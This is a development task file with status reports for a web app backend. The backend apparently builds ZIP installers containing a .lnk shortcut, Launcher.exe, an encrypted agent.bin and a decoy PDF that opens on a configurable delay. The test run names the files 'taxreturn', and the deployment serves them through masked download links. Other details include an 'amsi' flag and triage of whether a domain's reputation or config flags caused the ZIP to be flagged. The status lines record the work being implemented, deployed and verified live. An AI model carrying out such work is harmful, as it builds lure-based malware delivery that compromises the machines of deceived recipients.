**Status:** DONE + DEPLOYED + LIVE-VERIFIED 2026-09-21 (verifier) — deployed to VPS (`/opt/vantra` rsync + `npm run build` as `vantra` + `vantra.service` restarted, active), then E2E through the DEPLOYED route: session-JWT mint for a real public-org user (blast) → `POST /api/devices/deployments` `{installMethod:zip, pdf, pdfName:guide.pdf, FIX-3 names taxreturn}` → response `downloadUrl: https://dl.broks.beauty/d/01cba6f1…` (Task 74 tier routing correct); generator job zip = `{taxreturn.lnk, taxreturn/Launcher.exe, taxreturn/agent.bin, taxreturn/guide.pdf}`; WP6 card ALL PASS incl. `encrypted config carries attached PDF (guide.pdf)` + `PDF open delay (0s)`; masked link serves `200 application/zip`. Generator side needed its stale `launcher-build.ts`/`launcher-validate.ts`/`launcher.c`/`build-native.sh` synced to FIX 5 (first deployed build silently DROPPED the PDF entry — 3-entry zip; fixed by rsync from installer repo @324e5f8 + `vantra-msi-generator.service` restart; re-build carried the 4th entry). NOTE: E2E left a real `Task79-E2E` deployment in the blast org (24h expiry — self-cleans; no device was installed).

# Task 77 — Wire the FIX 5 ZIP+PDF payload through the web app backend

**Status:** DONE 2026-09-21 (local verify, no deploy/push per batch doc) — backend wired: `lib/zip-generator.ts` forwards optional top-level `pdf`/`pdfName`/`pdfDelaySec`, `route.ts` ZIP branch validates (400/413) + passes through, PDF transits in-memory only. Task 76 compliance: no flag changes (H1-leaning/inconclusive — launcherMode/amsi/authToken/FIX-3 untouched). Verified: `tsc` clean + body-shape/validation scripts (no-PDF keys absent, with-PDF top-level, 9 validation branches incl. 413 oversize). Live generator/VM build deferred to verifier.

## Before you start

Read `HOW_WE_MOVE_FAST.md` in this repo root (build/test discipline; you implement + locally verify, you do NOT deploy — the owner/verifier does live VPS verify + deploy after this batch) and `BATCH_3_ZIP_FLAG_AND_PDF_FLOW.md` (sequencing + guardrails). Then read `TASK_76_ZIP_FLAG_TRIAGE_DOMAIN_VS_FLAGS.md` — if its verdict names a culprit flag (H2), preserve/correct exactly that field here; if H1 (domain reputation), change nothing about hosts here. Then read the generator handoff in `../vantra-installer/README.md` → "⚡ Integrate this into the Vantra web app" §1–4 — that handoff IS the spec; this task file is the web-app-side work order. Key generator facts (verify against `../vantra-installer/generator/src/routes.ts` `postBuildZip` + `../vantra-installer/generator/src/launcher-build.ts` before coding): `POST /build` JSON accepts optional `pdf` (base64 data URL of the PDF bytes), `pdfName` (bare `*.pdf`, default `guide.pdf`, ≤ 64 chars, no path), `pdfDelaySec` (0–120, default 0 = open immediately); PDF ≤ 20 MB with `%PDF` magic; the PDF lands at `launcher/<pdfName>` inside the zip (`Update.lnk` stays alone at root); dev-only `pdfPath` requires generator env `ALLOW_LOCAL_PDF=1` — never use it from the web app.

## What you need to finish this task

- This repo: `lib/zip-generator.ts` (add `pdfBase64?`/`pdfName?` opts, forward as `pdf`/`pdfName` in the JSON body — no other shape changes), `app/api/devices/deployments/route.ts` (ZIP branch: accept + validate + pass through; do NOT touch merged/separated/MSI branches, the private-tier 403, tier-host resolution, or the Task 74 rewrite), `lib/installer-download-host.ts` (read-only — the PDF changes nothing about hosts).
- Generator repo (read-only): `../vantra-installer/generator/src/routes.ts` (§ PDF validation block) for the exact server rules to mirror; `../vantra-installer/generator/src/env.ts` (`ALLOW_LOCAL_PDF`, `PUBLIC_DOWNLOAD_BASE_URL`) so you don't accidentally depend on either.
- A small test PDF (any valid `%PDF`, well under 20 MB) for local verification. No production secrets, no DB migration (no schema change — PDF bytes transit only).

## Scope (replace only what is necessary)

1. **`lib/zip-generator.ts`** — add optional `pdfBase64?: string` (full `data:application/pdf;base64,…` URL) and `pdfName?: string` to `CallZipGeneratorOpts`; when set, include `pdf` / `pdfName` at the TOP level of the `/build` JSON body (sibling of `launcherMode`, NOT inside `flags`); when unset, omit both keys so the no-PDF flow stays byte-identical. Optionally accept `pdfDelaySec?: number` and forward it (default omit → generator's 0). Reuse the existing FIX 3 bare-name sanitizer pattern for `pdfName` if practical (bare `*.pdf`, ≤ 64 chars, reject `/ \ :` / control chars / `..`).
2. **`app/api/devices/deployments/route.ts`** (ZIP branch only) — accept optional `pdf` (base64 data URL string) + `pdfName` (+ optional `pdfDelaySec`) from the request body; validate EXACTLY like the existing MSI PDF upload in this same file (bytes decode → start with `%PDF`, ≤ 20 MB via `MAX_PDF_BYTES`, bare `*.pdf` name, no path separators / `..` / > 64 chars; malformed base64 → 400). Without a PDF: current behaviour unchanged (all fields optional, back-compatible with the live flow). With a PDF: decode ONCE server-side, re-encode or forward per the handoff, and pass to `callZipGenerator`. If the ZIP path currently only accepts JSON, extend the JSON schema (preferred — matches the handoff's `pdf`/`pdfName`-in-JSON transport); do NOT convert the ZIP path to `multipart/form-data` unless the file's own branching forces it — minimal diff.
3. **PDF hosting = the zip's hosting, nothing new** — the uploaded PDF is NEVER persisted in the DB or on the web-app filesystem; it transits in-memory to the generator, which bakes it into `jobs/<jobId>/output.zip` and serves it through the SAME masked `downloadUrl` (`<REDIRECT_BASE_URL>/d/<jobId>`, same TTL) as a no-PDF zip. No new route, no new table, no separate PDF URL. Say so in a code comment at the ZIP branch so the next reader doesn't "fix" it by adding storage.
4. **Task 76 verdict compliance** — one line in your final report stating which flag(s) the triage implicated and what you preserved/corrected here (or "triage inconclusive/H1 — no flag changes made").

## Out of scope

- `components/add-device-modal.tsx` — that's Task 78. The backend must accept the fields before the UI sends them, but do not build the UI here.
- MSI path (`multipart/form-data`, required PDF, `manufacturer`, branded EXE), merged/separated paths, `deployUrl`/TRMM wiring, Task 61/74 tier logic, DB schema/migrations, generator code itself.
- `pdfPath` / `ALLOW_LOCAL_PDF` — dev-only generator escape hatch; the web app must never send it.

## Verification expected

- `npx tsc --noEmit -p .` clean.
- Local generator build WITHOUT pdf via the new code → zip is `{ Update.lnk, launcher/Launcher.exe, launcher/agent.bin }` (byte-identical shape to before; validation card PASSes, incl. `PASS| encrypted config carries attached PDF` ABSENT as appropriate).
- Local generator build WITH pdf via the new code → zip contains `launcher/<pdfName>` alongside the three standard entries; validation card prints `PASS| encrypted config carries attached PDF` and `PASS| encrypted config carries PDF open delay`.
- Oversize (> 20 MB), non-`%PDF`, bad-`pdfName`, and malformed-base64 inputs each get a clean 400/413 (matching the generator's own codes where applicable), with no TRMM site/deployment orphaned beyond the file's existing no-rollback contract.
- No-PDF response shape unchanged (`{ jobId, downloadUrl, expiresAt }` + existing route envelope).

## When done

Update this file's `**Status: ...**` line (what you changed + local verification results), leave the tree buildable, and stop. Do not deploy, do not push, do not start Task 78.
